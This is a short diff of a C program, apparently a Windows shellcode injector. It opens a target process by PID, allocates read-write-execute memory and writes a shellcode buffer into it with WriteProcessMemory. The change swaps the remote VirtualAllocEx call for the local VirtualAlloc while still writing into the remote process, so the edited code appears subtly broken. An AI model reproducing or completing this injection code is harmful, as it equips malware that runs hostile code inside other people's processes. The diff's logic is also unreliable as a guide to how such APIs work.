@@ -49,7 +49,7 @@ int main() {
   printf("[*] Successfully opened handle to PID: %u\n", pid);
   
   // Allocate a block of memory that can store our shellcode
-  LPVOID bufferAddress = VirtualAllocEx(pHandle, NULL, sizeof buf, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
+  LPVOID bufferAddress = VirtualAlloc(NULL, sizeof buf, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
   if (bufferAddress == NULL) {
       printf("[ERROR] Failed to allocate memory within the process (PID: %u)! Error: %lu\n", pid, GetLastError());
       return -1;
@@ -57,7 +57,7 @@ int main() {
   
   printf("[*] Memory allocated at: 0x%016llx\n", bufferAddress);
   
-  // Write the shellcode to the block of memory that we allocated with VirtualAllocEx
+  // Write the shellcode to the block of memory that we allocated with VirtualAlloc
   BOOL writeShellcode = WriteProcessMemory(pHandle, bufferAddress, buf, sizeof buf, NULL);
   if(writeShellcode == false) {
       printf("[ERROR] Failed to write shellcode! Using addresss: 0x%016llx, Error: %lu\n", bufferAddress, GetLastError());
